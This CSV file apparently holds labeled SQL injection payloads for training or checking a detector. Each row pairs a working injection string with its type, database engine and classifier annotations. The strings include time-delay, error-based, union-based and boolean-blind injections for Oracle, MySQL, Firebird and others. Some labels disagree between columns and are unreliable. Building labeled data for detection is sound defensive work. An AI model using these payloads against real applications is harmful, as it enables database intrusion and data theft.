payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'ohqs' like 'ohqs,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1000,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'ohqs' like 'ohqs
"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'miir' like 'miir",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1001,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'miir' like 'miir"
"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1002,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #"
"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1003,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --"
-4615' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1004,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-4615' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )
"-9725' ) union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1005,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9725' ) union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--"
"1"" where 1051 = 1051 union all select null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1006,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" where 1051 = 1051 union all select null--"
"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""fpkm"" like ""fpkm",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1007,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""fpkm"" like ""fpkm"
"1', ( case when 5204 = 2136 then 1 else null end )",boolean_blind,generic,0.8,CASE for boolean blind,KEEP,,boolean_blind,generic,1008,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1', ( case when 5204 = 2136 then 1 else null end )"
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1009,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs"
